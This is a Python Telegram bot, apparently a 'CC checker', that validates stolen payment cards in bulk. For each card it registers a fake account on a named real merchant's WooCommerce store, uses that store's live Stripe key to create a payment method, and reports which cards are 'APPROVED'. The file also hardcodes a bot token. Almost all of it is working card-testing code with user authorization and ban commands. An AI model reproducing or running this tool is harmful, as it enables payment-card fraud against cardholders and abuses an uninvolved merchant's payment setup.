from telebot.async_telebot import AsyncTeleBot
import asyncio
import json
import re
import time
import httpx
import random
import string
from datetime import datetime

# User Agent Generator
def generate_user_agent():
    browsers = [
        # Chrome on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
        # Firefox on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{}.0) Gecko/20100101 Firefox/{}.0",
        # Edge on Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36 Edg/{}.0.0.0",
        # Chrome on macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{}_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36",
        # Safari on macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{}.0 Safari/605.1.15",
        # Chrome on Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36"
    ]
    
    chrome_version = random.randint(90, 120)
    firefox_version = random.randint(90, 120)
    edge_version = random.randint(90, 120)
    safari_version = random.randint(14, 17)
    mac_version = random.randint(11, 14)
    
    browser = random.choice(browsers)
    
    if "Chrome" in browser and "Edg" not in browser:
        return browser.format(chrome_version)
    elif "Firefox" in browser:
        return browser.format(firefox_version, firefox_version)
    elif "Edg" in browser:
        return browser.format(edge_version, edge_version)
    elif "Safari" in browser and "Chrome" not in browser:
        return browser.format(mac_version, safari_version)
    else:
        return browser.format(mac_version, chrome_version)

# Configure these values
BOT_TOKEN = "7208123631:AAGUqNvuKGKfPlKtZQ-8adNQwgtuGUIHof0"
OWNER_ID =  1718615866 # Replace with your Telegram user ID
AUTHORIZED_USERS = {11829, 1718615866}  # Set of authorized user IDs
ONGOING_CHECKS = set()  # Store user IDs of ongoing checks
BANNED_USERS = set()  # Set of banned user IDs

bot = AsyncTeleBot(BOT_TOKEN)

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email():
    return f"{generate_random_string(10)}@mailinator.com"

def generate_random_username():
    return f"user_{generate_random_string(8)}"

class CCChecker:
    def __init__(self, cc_data, message):
        cc_parts = cc_data.split('|')
        self.cc = cc_parts[0]
        self.month = cc_parts[1]
        self.year = cc_parts[2]
        self.cvv = cc_parts[3]
        self.message = message
        self.start_time = time.time()
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        self.username = f"user_{random.randint(1000, 9999)}"
        self.email = f"{self.username}@gmail.com"

    async def get_bin_info(self):
        headers = {
            'Accept-Version': '3',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        try:
            bin_number = self.cc[:6]
            async with httpx.AsyncClient() as client:
                response = await client.get(
                    f"https://lookup.binlist.net/{bin_number}",
                    headers=headers,
                    timeout=10.0
                )
                
                if response.status_code == 200:
                    data = response.json()
                    return {
                        'scheme': data.get('scheme', 'N/A').upper(),
                        'type': data.get('type', 'N/A').upper(),
                        'brand': data.get('brand', 'N/A'),
                        'bank': data.get('bank', {}).get('name', 'N/A'),
                        'country': data.get('country', {}).get('name', 'N/A'),
                        'country_code': data.get('country', {}).get('alpha2', 'N/A')
                    }
        except Exception as e:
            print(f"BIN lookup error: {str(e)}")
        
        # Return default values if API fails
        return {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A'
        }

    async def format_response(self, status, message):
        elapsed_time = time.time() - self.start_time
        username = self.message.from_user.username if self.message.from_user.username else str(self.message.from_user.id)
        
        # Get BIN info - now properly awaited
        bin_info = await self.get_bin_info()
        
        # Format CC for display
        cc_display = f"{self.cc}|{self.month}|{self.year}|{self.cvv}"
        
        return f"""『 Stripe Premium Auth 』
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗖𝗖 ➜ {cc_display}
𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {status}
Msp𝗲𝘀𝘀𝗮𝗴𝗲 ➜ {message}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗜𝗻𝗳𝗼 ➜ {bin_info['scheme']} - {bin_info['type']} - {bin_info['brand']}
𝐁𝐚𝐧𝐤 ➜ {bin_info['bank']}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {bin_info['country']} - {bin_info['country_code']}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝗧𝗶𝗺𝗲 ➜ {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ @{username}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━"""

    async def check(self):
        self.start_time = time.time()
        print(f"\n🔄 Starting check for CC: {self.cc[:6]}xxxxxx")
        try:
            async with httpx.AsyncClient(follow_redirects=True) as client:
                url = "https://www.wildfireoil.com/my-account/add-payment-method/"
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.wildfireoil.com',
                    'referer': 'https://www.wildfireoil.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': self.user_agent,
                }

                data = {
                    'username': self.username,
                    'email': self.email,
                    'password': f"{self.username}@pass1233",
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': 'https://www.wildfireoil.com/my-account/add-payment-method/',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': 'https://www.wildfireoil.com/my-account/add-payment-method/',
                    'wc_order_attribution_user_agent': self.user_agent,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'register': 'Register',
                }

                response = await client.post(url=url, headers=headers, data=data)
                response_text = response.text

                nonce_pattern = r'createAndConfirmSetupIntentNonce":"([^"]+)"'
                nonce = re.search(nonce_pattern, response_text)
                if not nonce:
                    return "❌ DECLINED: Registration Failed"
                nonce = nonce.group(1)

                url = "https://api.stripe.com/v1/payment_methods"
                headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': self.user_agent,
                }

                stripe_data = f'type=card&card[number]={self.cc}&card[cvc]={self.cvv}&card[exp_year]={self.year}&card[exp_month]={self.month}&allow_redisplay=unspecified&billing_details[address][postal_code]=10004&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F0dfb345d69%3B+stripe-js-v3%2F0dfb345d69%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.wildfireoil.com&time_on_page=384084&client_attribution_metadata[client_session_id]=e5b44a96-6d96-4989-a612-a58eddfc48c6&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=NA&sid=NA&key=pk_live_DmsTQwKKW6Kzi2XNHLbhZLr400x480lEav&_stripe_version=2024-06-20'

                response = await client.post(url=url, headers=headers, data=stripe_data)
                json_response = response.json()
                
                if "error" in json_response:
                    return await self.format_response("DECLINED", json_response["error"]["message"])
                    
                payment_method_id = json_response.get("id")
                if not payment_method_id:
                    return await self.format_response("DECLINED", json_response.get("message", "Payment Method Creation Failed"))

                url = "https://www.wildfireoil.com/"
                params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
                verify_data = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': payment_method_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }

                headers['user-agent'] = self.user_agent
                response = await client.post(url=url, params=params, data=verify_data, headers=headers)
                
                try:
                    result = response.json()
                    print("\nResponse JSON:", json.dumps(result, indent=2))  # Debug print
                    
                    # Handle the specific error response format
                    if not result.get("success"):
                        if "data" in result and isinstance(result["data"], dict):
                            if "error" in result["data"] and isinstance(result["data"]["error"], dict):
                                error_msg = result["data"]["error"].get("message", "Unknown Error")
                                return await self.format_response("DECLINED ❌", error_msg)
                        return await self.format_response("DECLINED ❌", "Transaction Failed")
                    
                    # Success case
                    if result.get("success"):
                        return await self.format_response("APPROVED ✅", "Card Successfully Authorized")
                    
                    # Fallback case
                    return await self.format_response("DECLINED ❌", "Unknown Response")
                    
                except json.JSONDecodeError:
                    print("\nInvalid JSON Response:", response.text)
                    return await self.format_response("DECLINED ❌", "Invalid Response")

        except Exception as e:
            print("\nException:", str(e))  # Print any exceptions to console
            return await self.format_response("ERROR ❌", str(e))

def load_cc_from_file(file_content):
    cc_list = []
    for line in file_content.split('\n'):
        line = line.strip()
        if re.match(r'^\d{16}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3,4}$', line):
            # Convert 2-digit year to 4-digit year if needed
            cc_parts = line.split('|')
            if len(cc_parts[2]) == 2:
                cc_parts[2] = '20' + cc_parts[2]
                line = '|'.join(cc_parts)
            cc_list.append(line)
    return cc_list

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or str(user_id)
    
    if user_id in BANNED_USERS:
        await bot.reply_to(message, "❌ You are banned from using this bot.")
        return
    
    print(f"🔵 /start command received from @{username} (ID: {user_id})")
    
    if user_id not in AUTHORIZED_USERS:
        print(f"❌ Unauthorized access attempt from @{username} (ID: {user_id})")
        await bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    print(f"✅ Authorized user @{username} started the bot")
    help_text = """
🔥 Welcome to CC Checker Bot 🔥

Commands:
/chk - Check single CC
Format: /chk 4452321927630488|07|2032|961

/mchk - Check multiple CCs
Reply to a text file containing CCs

Owner Commands:
/auth - Add authorized user
Format: /auth user_id

/ban - Ban a user
Format: /ban user_id

/unban - Unban a user
Format: /unban user_id

Made with ❤️ by @TyrantDx
"""
    await bot.reply_to(message, help_text)

@bot.message_handler(commands=['chk'])
async def check_cc(message):
    user_id = message.from_user.id
    username = message.from_user.username or str(user_id)
    
    if user_id in BANNED_USERS:
        await bot.reply_to(message, "❌ You are banned from using this bot.")
        return
    
    print(f"🔵 /chk command received from @{username} (ID: {user_id})")
    
    if user_id not in AUTHORIZED_USERS:
        print(f"❌ Unauthorized access attempt from @{username} (ID: {user_id})")
        await bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    try:
        cc_data = message.text.split(' ')[1]
        print(f"📊 Processing CC check for @{username}: {cc_data[:6]}xxxxxx")
        if not re.match(r'^\d{16}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3,4}$', cc_data):
            await bot.reply_to(message, "Invalid CC format. Use: XXXXXXXXXXXXXXXX|MM|YY|CVV or XXXXXXXXXXXXXXXX|MM|YYYY|CVV")
            return

        cc_parts = cc_data.split('|')
        if len(cc_parts[2]) == 2:
            cc_parts[2] = '20' + cc_parts[2]
            cc_data = '|'.join(cc_parts)

        username = message.from_user.username if message.from_user.username else str(message.from_user.id)

        processing_msg = await bot.reply_to(message, """『 Stripe Premium Auth 』
━━━━━━━━━━━━━━━━━━━━━━
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 🔄
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ @""" + username + """
━━━━━━━━━━━━━━━━━━━━━━""")
        
        checker = CCChecker(cc_data, message)
        result = await checker.check()
        
        await bot.edit_message_text(result, chat_id=message.chat.id, message_id=processing_msg.message_id)

    except IndexError:
        await bot.reply_to(message, "❌ Please provide a CC to check. Format: /chk XXXXXXXXXXXXXXXX|MM|YY|CVV")
    except Exception as e:
        print(f"❌ Error in check_cc: {str(e)}")
        await bot.reply_to(message, f"🚫 Error: {str(e)}")

@bot.message_handler(commands=['stop'])
async def stop_check(message):
    user_id = message.from_user.id
    if user_id in ONGOING_CHECKS:
        ONGOING_CHECKS.remove(user_id)
        await bot.reply_to(message, "✅ Mass check stopped. Please wait for the current card to finish...")
    else:
        await bot.reply_to(message, "❌ No ongoing mass check to stop.")

@bot.message_handler(commands=['mchk'])
async def check_multiple_cc(message):
    user_id = message.from_user.id
    username = message.from_user.username or str(user_id)
    
    if user_id in BANNED_USERS:
        await bot.reply_to(message, "❌ You are banned from using this bot.")
        return
    
    print(f"🔵 /mchk command received from @{username} (ID: {user_id})")
    
    if user_id not in AUTHORIZED_USERS:
        print(f"❌ Unauthorized access attempt from @{username} (ID: {user_id})")
        await bot.reply_to(message, "You are not authorized to use this bot.")
        return

    if user_id in ONGOING_CHECKS:
        await bot.reply_to(message, "❌ You already have an ongoing mass check. Use /stop to cancel it first.")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await bot.reply_to(message, "❌ Please reply to a text file containing CCs")
        return

    try:
        file_info = await bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)
        cc_list = load_cc_from_file(downloaded_file.decode('utf-8'))

        if not cc_list:
            await bot.reply_to(message, "❌ No valid CCs found in file")
            return
            
        if len(cc_list) > 5000:
            await bot.reply_to(message, "❌ Maximum limit is 5000 CCs per check. Please reduce the number of CCs and try again.")
            return

        ONGOING_CHECKS.add(user_id)  # Mark check as ongoing
        start_time = time.time()
        approved_count = 0
        declined_count = 0
        error_count = 0
        approved_ccs = []
        
        status_msg = await bot.reply_to(
            message, 
            f"""Starting mass check of {len(cc_list)} CCs... ⏳
Use /stop to cancel the check."""
        )

        for i, cc_data in enumerate(cc_list, 1):
            if user_id not in ONGOING_CHECKS:
                # Check was stopped by user
                summary_report = f"""『 Mass Check Stopped 』
━━━━━━━━━━━━━━━━━━━━━━
𝗧𝗼𝘁𝗮𝗹 𝗖𝗖𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➜ {i-1}/{len(cc_list)}
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ ➜ {approved_count}
𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌ ➜ {declined_count}
𝗘𝗿𝗿𝗼𝗿 ⚠️ ➜ {error_count}
━━━━━━━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ @{username}
━━━━━━━━━━━━━━━━━━━━━━"""
                await bot.edit_message_text(summary_report, 
                                          chat_id=message.chat.id, 
                                          message_id=status_msg.message_id)
                
                if approved_ccs:
                    approved_report = """『 Approved Cards 』
━━━━━━━━━━━━━━━━━━━━━━\n"""
                    for result in approved_ccs:
                        approved_report += f"{result}\n━━━━━━━━━━━━━━━━━━━━━━\n"
                    
                    await bot.send_message(chat_id=message.chat.id, text=approved_report)
                return

            progress_text = f"""『 Stripe Premium Auth 』
━━━━━━━━━━━━━━━━━━━━━━
Checking CC {i}/{len(cc_list)} 🔄
Progress: {(i/len(cc_list))*100:.1f}%
Use /stop to cancel the check
━━━━━━━━━━━━━━━━━━━━━━"""
            
            await bot.edit_message_text(progress_text, 
                                      chat_id=message.chat.id, 
                                      message_id=status_msg.message_id)

            checker = CCChecker(cc_data, message)
            result = await checker.check()
            
            if "APPROVED" in result:
                approved_count += 1
                approved_ccs.append(result)
            elif "DECLINED" in result:
                declined_count += 1
            else:
                error_count += 1

        end_time = time.time()
        total_time = end_time - start_time

        summary_report = f"""『 Mass Check Complete 』
━━━━━━━━━━━━━━━━━━━━━━
𝗧𝗼𝘁𝗮𝗹 𝗖𝗖𝘀 ➜ {len(cc_list)}
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ ➜ {approved_count}
𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌ ➜ {declined_count}
𝗘𝗿𝗿𝗼𝗿 ⚠️ ➜ {error_count}
━━━━━━━━━━━━━━━━━━━━━━
𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ➜ {total_time:.2f} seconds
𝗔𝘃𝗲𝗿𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 ➜ {total_time/len(cc_list):.2f} sec/card
━━━━━━━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ @{username}
━━━━━━━━━━━━━━━━━━━━━━"""

        await bot.edit_message_text(summary_report, 
                                  chat_id=message.chat.id, 
                                  message_id=status_msg.message_id)

        if approved_ccs:
            approved_report = """『 Approved Cards 』
━━━━━━━━━━━━━━━━━━━━━━\n"""
            for result in approved_ccs:
                approved_report += f"{result}\n━━━━━━━━━━━━━━━━━━━━━━\n"
            
            await bot.send_message(chat_id=message.chat.id, text=approved_report)

    except Exception as e:
        print(f"❌ Error in check_multiple_cc: {str(e)}")
        error_msg = f"""『 Mass Check Error 』
━━━━━━━━━━━━━━━━━━━━━━
𝗘𝗿𝗿𝗼𝗿 ➜ {str(e)}
━━━━━━━━━━━━━━━━━━━━━━"""
        await bot.reply_to(message, error_msg)
    finally:
        if user_id in ONGOING_CHECKS:
            ONGOING_CHECKS.remove(user_id)  # Clean up ongoing check status

@bot.message_handler(commands=['auth'])
async def auth_user(message):
    if message.from_user.id != OWNER_ID:
        await bot.reply_to(message, "Only the owner can authorize users.")
        return

    try:
        new_user_id = int(message.text.split(' ')[1])
        AUTHORIZED_USERS.add(new_user_id)
        await bot.reply_to(message, f"✅ User {new_user_id} has been authorized.")
    except:
        await bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric ID.")

@bot.message_handler(commands=['ban'])
async def ban_user(message):
    if message.from_user.id != OWNER_ID:
        await bot.reply_to(message, "❌ Only the owner can ban users.")
        return

    try:
        # Get the user ID to ban
        user_id = int(message.text.split(' ')[1])
        
        # Check if user is already banned
        if user_id in BANNED_USERS:
            await bot.reply_to(message, f"❌ User {user_id} is already banned.")
            return
            
        # Can't ban the owner
        if user_id == OWNER_ID:
            await bot.reply_to(message, "❌ Cannot ban the owner.")
            return
            
        # Add user to banned set
        BANNED_USERS.add(user_id)
        
        # Remove from authorized users if present
        if user_id in AUTHORIZED_USERS:
            AUTHORIZED_USERS.remove(user_id)
            
        # Stop any ongoing checks from this user
        if user_id in ONGOING_CHECKS:
            ONGOING_CHECKS.remove(user_id)
            
        await bot.reply_to(message, f"✅ User {user_id} has been banned.")
        
    except IndexError:
        await bot.reply_to(message, "❌ Please provide a user ID to ban.\nFormat: /ban user_id")
    except ValueError:
        await bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric ID.")

@bot.message_handler(commands=['unban'])
async def unban_user(message):
    if message.from_user.id != OWNER_ID:
        await bot.reply_to(message, "❌ Only the owner can unban users.")
        return

    try:
        # Get the user ID to unban
        user_id = int(message.text.split(' ')[1])
        
        # Check if user is banned
        if user_id not in BANNED_USERS:
            await bot.reply_to(message, f"❌ User {user_id} is not banned.")
            return
            
        # Remove user from banned set
        BANNED_USERS.remove(user_id)
        await bot.reply_to(message, f"✅ User {user_id} has been unbanned.")
        
    except IndexError:
        await bot.reply_to(message, "❌ Please provide a user ID to unban.\nFormat: /unban user_id")
    except ValueError:
        await bot.reply_to(message, "❌ Invalid user ID. Please provide a valid numeric ID.")

if __name__ == "__main__":
    print("""
╔════════════════════════════════════════╗
║         Stripe Auth Checker Bot        ║
║            Started Successfully        ║
╚════════════════════════════════════════╝
""")
    
    try:
        print("✅ Bot is running...")
        print("👉 Press Ctrl+C to stop the bot")
        asyncio.run(bot.polling(non_stop=True, timeout=60))
    except KeyboardInterrupt:
        print("\n⚠️ Bot stopped by user")
    except Exception as e:
        print(f"\n❌ Error occurred: {str(e)}")
    finally:
        print("\n🔄 Bot session ended")
